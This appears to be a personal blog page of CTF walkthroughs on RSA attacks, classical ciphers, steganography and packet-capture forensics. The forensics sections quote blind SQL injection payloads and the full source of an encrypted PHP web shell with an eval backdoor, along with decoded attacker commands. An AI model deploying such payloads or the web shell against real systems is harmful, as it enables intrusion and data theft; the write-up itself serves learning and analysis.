---
layout: about
category: about
wrench: 2021-11-19
toc: true
Researchname: CTF - 密码学与杂项
author: Bin4xin
permalink: /about/CTF-Crypto-and-Misc-etc-WalkThrough/
---

# 零：Crypto

## RSA题型

> *Tips：RSA加解密的算法完全相同，公钥加密体制中，一般用公钥加密，私钥解密，设 c 为明文，m 为密文；公式如下：*

$$ c ≡ m^e mod \quad n\\m ≡ c^d mod \quad n$$

> RSA 的算法涉及三个参数，n、e、d：
>
> n是两个大质数 p、q 的积，n 的二进制表示所占用的位数，就是所谓的密钥长度；
>
> e 和 d 是一对相关的值，e 可以任意取，但要求 e 与(p-1)(q-1)互质，再选择 d；

- 其中，p、q为质数，n、e、d计算如下：

$$n = p * q$$

$$ø(n) = (p - 1) * (q - 1)$$

$$ed ≡ 1\ mod\ ø(n) $$

*（n，e),(n，d)就是密钥对。其中(n，e)为公钥，(n，d)为私钥。*

#### # 0x01 公钥加密文

- 题干：给出公钥文件：`.pem/.pub`后缀文件、密文：`.enc`之类后缀的文件；
    - [例题1](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CTF/Crypto/例题1.zip){:target="_blank"}
    - [例题2](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CTF/Crypto/例题2.zip){:target="_blank"}
- 解法：分析`pem/pub`文件恢复私钥，通过私钥对enc文件进行解密得到flag；

例题1文件如下：

```bash
➜ ll
-rw-r--r--@  1 bin4xin  staff   32  4 29  2016 flag.enc
-rw-r--r--@  1 bin4xin  staff  138  4 29  2016 pubkey.pem

➜ file flag.enc
flag.enc: data
➜ file pubkey.pem
pubkey.pem: ASCII text
➜ cat pubkey.pem
-----BEGIN PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr
yigb/+l/vjDdAgMBAAE=
-----END PUBLIC KEY-----
```

- 解： `solve.py --verbose -k pubkey.pem --decrypt flag.enc`
	- [3summer/CTF-RSA-tool](https://github.com/3summer/CTF-RSA-tool){:target="_blank"}

![截屏2021-07-29 上午11.43.12.png](https://i.loli.net/2021/07/29/zct5knF6u7BvrES.png)

同样的：例题2类似：

```bash
$ rsatools --publickey public.pem  --uncipherfile flag.enc
private argument is not set, the private key will not be displayed, even if recovered.

[*] Testing key public.pem.
[*] Performing pastctfprimes attack on public.pem.
 90%|█████████████████████████████████████████████████████████████████████▌       | 102/113 [00:00<00:00, 1445.70it/s]
[*] Attack success with pastctfprimes method !

Results for public.pem:

Unciphered data :
HEX : 0x61666374667b5235345f7c355f24305f423072696e397d
INT (big endian) : 9329062300443879711046737916988523093598680555377801597
INT (little endian) : 11994109012077315504651226639166102749077267728721733217
utf-8 : afctf{R54_|5_$0_B0rin9}
STR : b'afctf{R54_|5_$0_B0rin9}'
···
```

#### # 0x02 文本

赛题给出一段文本，主要考察RSA公式的用法，考虑已知变量，使用什么攻击手法；

题干：
在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17，求解出d

直接用后面三个公式：

$$n=pq=473398607161*4511491\\ø(n) = (473398607161 - 1) * (4511491 - 1)\\17*d ≡ 1\ mod\ ø(n)$$

也就是：

$$\frac{17d-1}{ø(n)} = int() = \frac{17d-1}{2135733082216268400}\\d=\frac{2135733082216268401}{17}=125631357777427553$$

同样也可以通过rsatools来解：
```bash
➜ ln -s /{path/to}/CTF-RSA-tool/solve.py /usr/local/bin/rsatools
➜ rsatools --verbose --private -N 2135733555619387051 -e 17 -p 473398607161 -q 4511491
```
![截屏2021-08-03 下午4.00.13.png](https://i.loli.net/2021/08/03/DJtV9CZhLsSq8AY.png)

#### # 0x03 流量（.pcap）文件

> 有时出题人会给你一个流量包，你需要用wireshark等工具分析，然后根据流量包的通信信息，分析题目考察的攻击方
> 
> 法，你可以提取出所有你解题需要用到的参数，然后进行解密

举例题目暂时没有遇到，有的话会补上[...]

#### # 0x04 本地脚本分析

> 题目会给你一个脚本和一段密文，一般为python编写，你需要逆向文件流程，分析脚本的加密过程，写出对应的解密脚本进行解密

```bash
from Crypto.Util.number import *
import binascii
import gmpy2
flag = '*****************************************'
hex_flag=int(flag.encode("hex"),16)

p=getPrime(256)
q=getPrime(256)
n=p*q

e=0x3
c1=pow(hex_flag,e,n)
c2=pow(hex_flag+1,e,n)

print("n=",hex(n))
print("e=",hex(e))
print("c1=",hex(c1))
print("c2=",hex(c2))

#('n=', '0xb28ae8f29f8b90e8b8c5667b2b71e49929446b41f7f7a3e9e45bc52a1e8c45d59c1788be48a9c365d51feee0b2cd3295001cdad1ba5ccf808686b5ce5a269ae5L')
#('e=', '0x3')
#('c1=', '0x7ba5502ecbc3b15ad8c2db8f30a593eb062dde4d7dfacadf0a28291d1a576389a18dfba0607c0243f843f637449089dd2090d47ee9845d4147f02afd4d891f19L')
#('c2=', '0x891ac4f663df41c1f6433ee3513d749c3ba02fe0aacd7f51d791b9bac4f7e5194bd484d78d972c344faf600f7d3aa580485774768efc47ab8ddb67eeeb330fa1L')
```
如上所示，已知n、e、c1、c2和、c2的表达式；我们可以求出`hex_flag`的值：

$$ \left\{
\begin{aligned}
c1 ≡ hexflag^3 & (mod \quad n)\\
c2 ≡ (hexflag+1)^3 & (mod \quad n)\\
\end{aligned}
\right.$$



> *Tips：*这里pow(a,b,c)的意思就是取模，为：
> 
> $$pow(a,b,c) = a^b mod \quad c\\eg: 7^1 mod \  3 = 1$$
> 
>       >>> a=7
>       >>> b=1
>       >>> c=3
>       >>> n=pow(a,b,c)
>       >>> print n
>       1
>

- 看起来很简单，把`hex_flag`算出来自然flag就出来了，但是实际上我们需要做的是把上面的数学公式输出成代码，因为给出的已知数太大；所以需要公式推导来生成代码：

$$ \because \quad c = pow(mm+padding,e,n)\\
\therefore \quad \left\{
\begin{aligned}
c_1 ≡ (m+padding_1)^e & (mod n)\\
c_2 ≡ (m+padding_2)^e & (mod n)\\
\end{aligned}
\right.\\
令：m_1=m+padding_1 , m_2=m+padding_2; \\
\therefore \quad m_1-m_2 =  padding_1 - padding_2\\
\therefore \quad \left\{
                 \begin{aligned}
                 f(x)=ax+b\\
                 m_1=m_2+(padding_1 + padding_2)\\
                 \end{aligned}
                 \right.\\
\therefore \quad f(m_1) = am_2 + b\\
由 \ c ≡ m^e \ mod \ n ，代入c_1 、c_2 \\ \therefore \quad \left\{
                                                            \begin{aligned}
                                                            c_1 ≡ m_1^e & (mod \ n)\\
                                                            c_2  ≡ m_2^e & (mod \ n)\\
                                                            \end{aligned}
                                                            \right.\\
又 \because \ m_1 = am_2 + b \\ \therefore \quad \left\{
                                                     \begin{aligned}
                                                     c_1 ≡ (am_2 + b)^e & (mod \ n)\\
                                                     c_2  ≡ m_2^e & (mod \ n)\\
                                                     \end{aligned}
                                                     \right.\\
代入e=3 ，展开 \\ \therefore \quad (am_2+b)^3 = a^3m_2^3 + 3b(am_2)^2 + 3am_2b^2 + b^3\\
\therefore \quad c_1 ≡ a^3m_2^3 + 3b(am_2)^2 + 3am_2b^2 + b^3 mod \ n\\
\therefore \quad c_1  ≡ a^3m_2^3 + 3ba^2m_2^2 + 3b^2am_2 + 3b^3 - 2b^3 mod \ n\\
\therefore \quad c_1 - a^3m_2^3 + 2b^3 ≡ 3b(a^2m_2^2 + bam_2 + b^2) mod \ n \\
又\because \quad (am_2)^3 - b^3 ≡ (am_2 - b)(a^2m_2^2 + bam_2 + b^2) \\
\therefore \quad \left\{  \begin{aligned}
         c_1 - a^3m_2^3 + 2b^3 ≡ 3b(a^2m_2^2 + bam_2 + b^2) mod \ n \qquad (1) \\
         (am_2)^3 - b^3 ≡ (am_2 - b)(a^2m_2^2 + bam_2 + b^2) mod \ n  \qquad (2) \\
         c_2 ≡ m_2^3 \ mod \ n \qquad (3)\\ 
         \end{aligned}
         \right.\\
\therefore \quad \left\{  \begin{aligned}
         (am_2-b)(c_1 - a^3m_2^3 + 2b^3) ≡ (am_2-b)[3b(a^2m_2^2 + bam_2 + b^2)] mod \ n\\
         3b[(am_2)^3 - b^3] ≡ 3b(am_2 - b)(a^2m_2^2 + bam_2 + b^2) mod \ n \\
         \end{aligned}
         \right.\\
\therefore \quad (am_2-b)(c_1 - a^3m_2^3 + 2b^3) ≡ 3b[(am_2)^3 - b^3] mod \ n \\
代入：(c_1 - a^3c_2 + 2b^3)(am_2 - b) ≡ 3b(a^3c_2 - b^3) mod \ n \\
\because \quad m = m_2 -padding_2\\
\therefore \quad m ≡ (\frac{3b(a^3c_2-b^3)}{c_1-a^3c_2+2b^3}+b) \ a - padding2 \ mod \ n (求a的逆元)\\
$$

既然推导出了公式，写脚本即可
```python
import gmpy
import binascii

def getM2(a,b,c1,c2,n,e):
	a3 = pow(a,e,n)
	b3 = pow(b,e,n)
	first = c1-a3*c2+2*b3
	print("first:")
	print(first)
	first = first % n
	second = e*b*(a3*c2-b3)
	second = second % n
	third = second*gmpy.invert(first,n)
	third = third % n
	fourth = (third+b)*gmpy.invert(a,n)
	return fourth % n

e=0x3
a=1
b=-1 #padding1-padding2
c1=0x7ba5502ecbc3b15ad8c2db8f30a593eb062dde4d7dfacadf0a28291d1a576389a18dfba0607c0243f843f637449089dd2090d47ee9845d4147f02afd4d891f19
c2=0x891ac4f663df41c1f6433ee3513d749c3ba02fe0aacd7f51d791b9bac4f7e5194bd484d78d972c344faf600f7d3aa580485774768efc47ab8ddb67eeeb330fa1
padding2=1 #padding2
n=0xb28ae8f29f8b90e8b8c5667b2b71e49929446b41f7f7a3e9e45bc52a1e8c45d59c1788be48a9c365d51feee0b2cd3295001cdad1ba5ccf808686b5ce5a269ae5

m = getM2(a,b,c1,c2,n,e)-padding2

#print m
#print hex(m)
#print binascii.unhexlify(hex(m))
print(binascii.unhexlify(hex(m)[2:].strip("L")))
```

> **binascii.unhexlify**：返回由十六进制字符串 hexstr 表示的二进制数据。此函数功能与 b2a_hex() 相反。 hexstr 必须包含偶数个十六进制数
> 字（可以是大写或小写），否则会引发Error 异常。

![截屏2021-08-06 上午9.11.12.png](https://i.loli.net/2021/08/06/czQdGEHUNkomajY.png)

## 算法解密

#### # 0x05 栅栏算法

> 题目描述：被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 
> 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 
> 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的 
> 图画，上面画着一个农妇在`栅栏里面喂5只小鸡`，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。

题干：
- 给出文件字符串`ccehgyaefnpeoobe{lcirg}epriec_ora_g`
- 栅栏里面喂5只小鸡；栅栏算法，5

![截屏2021-08-02 下午2.21.01.png](https://i.loli.net/2021/08/02/FGzs62Pk3TD5cCZ.png)

#### # 0x06 凯撒密码

[...]

#### # 0x07 摩尔斯电码 · morse

题干1：
- 给出一串数字`11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110`，根据1高位/0低位转换为摩丝码最终转换即可

![截屏2021-08-02 下午2.46.36.png](https://i.loli.net/2021/08/02/kTxuAnpBhWwHMaR.png)

**值得注意的是，就如上面的题干一样，有时给出的题目不一定会那么耿直让你一眼看出来或者用工具转换出来，需要做一些其他的转换：**

题干2:

```
--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-
```

很明显题1是空格分割，那么题2就是`/`分割，当然也可以把斜杠换成空格在转换，都是一样的；

![截屏2021-08-02 下午2.50.22.png](https://i.loli.net/2021/08/02/cEa31ujitTUCgnW.png)

通过算法转换后给出：
```
MAY_BE_HAVE_ANOTHER_DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA
```

很明显是2次加密，AB混合的字符串；有Crypto CTF经验的大手子们一眼就能看出来，培根编码：
![截屏2021-08-02 下午3.15.58.png](https://i.loli.net/2021/08/02/PvbsEjXrCF2KfVN.png)
小写：

```bash
>>> s="ATTACKANDDEFENCEWORLDISINTERESTING"
>>> print(s.lower())
attackanddefenceworldisinteresting
```

## 参考

- [RSA算法原理（一）](https://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html){:target="_blank"}
- [RSA算法原理（二）](https://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html){:target="_blank"}
- [CTF中RSA题型解题思路及技巧](https://www.freebuf.com/articles/others-articles/161475.html){:target="_blank"}
- [RSA 加密算法主要公式](https://cloud.tencent.com/developer/article/1686989){:target="_blank"}
- [浅析RSA Padding Attack](https://www.anquanke.com/post/id/158944){:target="_blank"}


# 一：Misc

## 文件隐写

#### # 1x00 格式文件参考 加粗的为常用

{: .table}
|文件格式 | 头尾值 |
| :--- | :--- |
| **JPEG (jpg)**             |**文件头：FFD8FF** |　　　　　　　　　
| **PNG (png)**              |**文件头：89504E47  文件尾：0000000049454E44AE426082** |
| **GIF (gif)**              |**文件头：47494638** |
| **ZIP Archive (zip)**      |**文件头：504B0304 文件尾：00000000** |
| TIFF (tif)**               |**文件头：49492A00** |
| Windows Bitmap (bmp)       |文件头：424D |
| CAD (dwg)                  |文件头：41433130 |
| Adobe Photoshop (psd)      |文件头：38425053 |
| Rich Text Format (rtf)     |文件头：7B5C727466 |
| XML (xml)                  |文件头：3C3F786D6C |
| HTML (html)                |文件头：68746D6C3E |
| Email thorough only - (eml)|文件头：44656C69766572792D646174653A |
| Outlook Express (dbx)      |文件头：CFAD12FEC5FD746F |
| Outlook (pst)              |文件头：2142444E |
| MS Word/Excel (xls.or.doc) |文件头：D0CF11E0 |
| MS Access (mdb)            |文件头：5374616E64617264204A |
| WordPerfect (wpd)          |文件头：FF575043 |
| Adobe Acrobat (pdf)        |文件头：255044462D312E |
| Quicken (qdf)              |文件头：AC9EBD8F |
| Windows Password (pwl)     |文件头：E3828596 |
| **RAR Archive (rar)**      |**文件头：52617221** |
| **Wave (wav)**             |**文件头：57415645** |
| AVI (avi)                  |文件头：41564920 |
| Real Audio (ram)           |文件头：2E7261FD |
| Real Media (rm)            |文件头：2E524D46 |
| MPEG (mpg)                 |文件头：000001BA |
| MPEG (mpg)                 |文件头：000001B3 |
| Quicktime (mov)            |文件头：6D6F6F76 |
| Windows Media (asf)        |文件头：3026B2758E66CF11 |
| MIDI (mid)                 |文件头：4D546864 |

#### # 1x01 图片隐写

- 题目1：word的本质

根据题目标题和附件，猜测可能和word文件格式的后缀相关；给出的文件是[word的本质的附件.docx](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CTF/MISC/word的本质的附件.docx)

给出一份word文档可以打开，内容如下：
![截屏2021-08-18 下午5.07.33.png](https://i.loli.net/2021/08/18/C2gG5InSMyzT1tU.png)

老规矩，`binwalk`查看一下文件
```bash
➜ binwalk word的本质的附件.docx

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v1.0 to extract, name: _rels/
···
8139          0x1FCB          Zip archive data, at least v1.0 to extract, compressed size: 31149, uncompressed size: 31149, name: word/media/image1.jpg
39339         0x99AB          Zip archive data, at least v1.0 to extract, compressed size: 19960, uncompressed size: 19960, name: word/media/image2.png
···
105465        0x19BF9         End of Zip archive, footer length: 22
```
看到是zip文件，直接`➜ mv word的本质的附件.docx word的本质的附件.zip`，然后解压得到flag；`image1.jpg`是上面文档中的图片：

![截屏2021-08-18 下午5.15.45.png](https://i.loli.net/2021/08/18/2JmebUsQ3FkrnDz.png)

- 题目2：简单的图片

[简单的图片的附件.zip](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CTF/MISC/简单的图片的附件.zip)
```bash
➜  binwalk 简单的图片的附件.zip
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 1214015, uncompressed size: 1226323, name: 2.png
1214050       0x128662        Zip archive data, at least v2.0 to extract, compressed size: 1008239, uncompressed size: 1008124, name: 1.png
2222498       0x21E9A2        End of Zip archive, footer length: 22
```
zip压缩包可以直接解压出两张看起来一摸一样的图片；同样的：使用`binwalk`分别查看一下两张图片：
```bash
➜ binwalk 1.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1080 x 720, 8-bit/color RGB, non-interlaced
179           0xB3            Zlib compressed data, best compression
310064        0x4BB30         MySQL MISAM compressed data file Version 11

➜ binwalk 2.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1080 x 720, 8-bit/color RGB, non-interlaced
```
注意到`MySQL MISAM compressed data file Version 11`这一段，不知道是啥，全部提取出来康康：`➜ binwalk --dd=".*" 1.png`
```bash
➜ ll
total 9880
drwxr-xr-x  6 bin4xin  staff      192  8 19 10:01 ./
drwx------  8 bin4xin  staff      256  8 19 09:49 ../
-rw-r--r--  1 bin4xin  staff  1008124  8 19 09:49 0
-rw-r--r--@ 1 bin4xin  staff   698060  8 19 09:49 4BB30
-rw-r--r--  1 bin4xin  staff  2333520  8 19 09:49 B3
-rw-r--r--  1 bin4xin  staff  1007945  8 19 09:49 B3.zlib

➜ file 4BB30
4BB30: MySQL MyISAM index file Version 11, 50404 key parts, 19163 unique key parts, 111 keys, 1846990095656532900 records, 1063746735895758743 deleted records
```
[查了查资料](https://www.jianshu.com/p/2ea6d3b98ff5)是Mysql的存储文件，但是需要[三个单独(.FRM /.MYD /.MYI)的文件](https://blog.csdn.net/qq_42352175/article/details/86097931)才能查看mysql的数据，但是我们只有`.MYI`的文件。

然后就这样一直卡着；直到看了解题思路：

- 盲水印
  - [解题工具BlindWaterMark](https://github.com/chishaxie/BlindWaterMark)
  - 实测两张图片调整顺序不会影响最终结果：
    - `python bwm.py decode 2.png 1.png Result-1.png`
    - `python bwm.py decode 1.png 2.png Result-2.png`

![截屏2021-08-19 上午11.17.18.png](https://i.loli.net/2021/08/19/K8iPZ4nfgSoXeOW.png)

所以，如果遇到两张相同的图的题目没有思路，可以往盲水印考点上来靠靠。

- 题目3：简单隐写，给出的是一张png图片：[简单隐写的附件.png](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CTF/MISC/简单隐写的附件.png)

> *Tips:* 最近做其他题目思路顺手看了一下发现url不存在，应该是当时没传上去；找到文件附件在修改链接

打开是一张空白的图片，高宽1195x1195

![截屏2021-08-20 下午5.01.53.png](https://i.loli.net/2021/08/20/PNmI4eyWxO1r8ZG.png)

#### # 1x02 音频隐写

- 题目：[去吧！追寻自由的电波](https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/%E5%8E%BB%E5%90%A7%EF%BC%81%E8%BF%BD%E5%AF%BB%E8%87%AA%E7%94%B1%E7%9A%84%E7%94%B5%E6%B3%A2/src/radio.mp3)
    - [题解](https://github.com/USTC-Hackergame/hackergame2021-writeups/tree/master/official/%E5%8E%BB%E5%90%A7%EF%BC%81%E8%BF%BD%E5%AF%BB%E8%87%AA%E7%94%B1%E7%9A%84%E7%94%B5%E6%B3%A2)；
    - 使用Audacity减慢播放速度即可。

## 流量分析（.pacp）题

#### # 1x03 SQL注入攻击

- [timu.pcapng](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CTF/MISC/timu.pcapng)

打开显示为注入payload`id=1' and ascii(substr((select flag from t),1,1))=33--`，是使用二分法判断SQL语句执行对应的Ascii字符是否相等：

![截屏2021-09-03 下午4.31.28.png](https://i.loli.net/2021/09/03/hup13CgkwsoTVRa.png)

所以直接来看一下返回包的页面是否有不同的地方：`Analyze->Follow->TCP/HTTP Stream`

![截屏2021-09-03 下午4.35.28.png](https://i.loli.net/2021/09/03/mgI9SUcGn4OLPTu.png)

两边不同显示：左边为错误Ascii，右边为正确的Ascii，按照顺序`(substr((select flag from t),1,1)->(n,1)`得到：

```bash
GET /ctf/Less-5/?id=1' and ascii(substr((select flag from t),1,1))=102--  HTTP/1.1
GET /ctf/Less-5/?id=1' and ascii(substr((select flag from t),2,1))=108--  HTTP/1.1
GET /ctf/Less-5/?id=1' and ascii(substr((select flag from t),3,1))=97--  HTTP/1.1
GET /ctf/Less-5/?id=1' and ascii(substr((select flag from t),4,1))=103--  HTTP/1.1
···
```

查一下[Ascii字母表](https://blog.csdn.net/Lucky_bo/article/details/52247939)

得到flag：

`102 108 97 103 123 119 49 114 101 115 104 65 82 75 95 101 122 95 49 115 110 116 105 116 125`->`flag{w1reshARK_ez_1snt}`

#### # 1x04 [...]usb流量分析

[...]

#### # 1x05 取证/攻击行为

- 无题目描述；给出的是一份流量文件：[backdoor.pcapng](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CTF/MISC/backdoor/backdoor.pcapng)

打开一看映入眼帘的是一系列SQL注入的payload：(`File -> Export Objects -> HTTP`)

![截屏2021-09-08 下午2.32.14.png](https://i.loli.net/2021/09/08/yPQAJtCO2LIVT8W.png)

导出几个出来看看，得到一些数据库的信息：

![截屏2021-09-08 下午2.28.44.png](https://i.loli.net/2021/09/08/j7mBCryiQ1SONfh.png)

往下就是`Login.php POST包`登录成功的信息：
```bash
POST /login.php HTTP/1.1
···
username=admin&password=mysql&button=SIGN-IN
HTTP/1.1 302 Found
Location: ./admin/index.php
```
接着往下，获取到了一些有用的信息，流量显示`Upload.php`Post上传成功了一个php马：
```php
<?php
    session_start();
    @set_time_limit(0);
	@error_reporting(0);
    function E($D,$K){
        for($i=0;$i<strlen($D);$i++) {
            $D[$i] = $D[$i]^$K[$i+1&15];
        }# E函数为异或加密
        return $D;
    }
    function Q($D){
        return base64_encode($D);
    }# Q函数为base64编码
    function O($D){
        return base64_decode($D);
    }# O函数为base64解码
    $P='pass'; # 木马连接参数
    $V='payload'; # 执行载荷
    $T='3c6e0b8a9c15224a'; # 加密密钥
    if (isset($_POST[$P])){
        $F=O(E(O($_POST[$P]),$T));
        if (isset($_SESSION[$V])){
            $L=$_SESSION[$V];
            $A=explode('|',$L);
            class C{public function nvoke($p) {eval($p."");}}
            $R=new C();
			$R->nvoke($A[0]);
            echo substr(md5($P.$T),0,16);
            echo Q(E(@run($F),$T));
            echo substr(md5($P.$T),16);
        }else{
            $_SESSION[$V]=$F;
        }
    }
#/upload/1615384904.php 上传成功，为1615384904.php
```
- 那么我们只需要关注`1615384904.php`攻击者操作木马进行了哪些操作就好；全部导出，操作流量全加密类似：
    - 请求POST`pass=OgRUWzZ%2FDUw5ZQRbYXFQfylbVFwGfwlPOXQAWlBjNAo0Wg1fAH4KTjdfb1tkTidcOltUYjJpXAQ%3D`
    - 返回：

```
11cd6a8758984163LmIwSi9SBgguZXwBfFkRSQEEUXsvbDRDLltSA39gKAYtdVBHA3Agci5lYEh/XgYCLmIoSCxRVE4CeXR5f2A4Sy1iKAQsfApOLXIARVN8IHg=6c37ac826a2a04bc
```

- 查看代码逻辑：`post传入参数pass`->`$T密钥加密`->`$V传入class C`进而传入eval函数进行命令执行，所以我们下一步需要做的是破解木马的加密方式，[解密代码](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CTF/MISC/backdoor/jiemi.php){:target="_blank"}
    - 解得上面的POST请求为：`cmdLine=bHMK&methodName=ZXhlY0NvbW1hbmQ=` -> base64decode ->`cmdLine=ls&methodName=execCommand`
    - 返回包：`1532851276json       1532851294.php       1532851316.php       1615384904.php`

- 进一步分析得到备份命令：`cmdLine=zip www.zip -rP $APACHE_RUN_USER /var/www/html/&methodName=execCommand`
    - 从流量文件中找到`www.zip`导出，解压密码是`$APACHE_RUN_USER`也是从流量中执行`env`命令`cmdLine=ZW52Cg==&methodName=ZXhlY0NvbW1hbmQ=`解密得到：
    - 
        ```bash
        APACHE_RUN_DIR=/var/run/apache2
        APACHE_PID_FILE=/var/run/apache2/apache2.pid
        PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
        APACHE_LOCK_DIR=/var/lock/apache2
        LANG=C
        APACHE_RUN_USER=www-data
        APACHE_RUN_GROUP=www-data
        APACHE_LOG_DIR=/var/log/apache2
        PWD=/app/admin/upload
        ```
- 解压出html目录下php代码发现`flag.php`：
    - 
        ```php
        <?php
        $enc = 'aes-128-ecb';
        $flag = 'CN1Sq9tFItxZhsu3zCWbrdf6ozOL4eoKG0s71vGg/AKKnch3IL3jzwtXeCgWK5QP';
        ?>
        ```
- 观察目录下发现存在被修改的php代码：（以下为参考教程给出-。-）

![截屏2021-09-08 下午4.14.04.png](https://i.loli.net/2021/09/08/uUHT3GLDnqiRYtw.png)

- 使用后加的代码对空白字符进行解码，并`file_put_contents('tmp2.txt',base64_decode($out));`输出到`tmp2.txt`文件中，同样文件中输出也有空白字符，再次解码即可；

![截屏2021-09-08 下午4.16.03.png](https://i.loli.net/2021/09/08/aL9SKwjU2bytBqH.png)

- [解码代码](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CTF/MISC/backdoor/kongbai-jiemi.php){:target="_blank"}

![截屏2021-09-08 下午4.20.58.png](https://i.loli.net/2021/09/08/7RVMhvliOXIfoZJ.png)

使用获得的key[在线解密](http://tool.chacuo.net/cryptaes){:target="_blank"}`aes-128-ecb`算法，得到flag：`DASCTF{d8f191d0f0be0f039c4ededb7839218e}`
#### # 1x06 [...]上传/下载文件

# 二：...

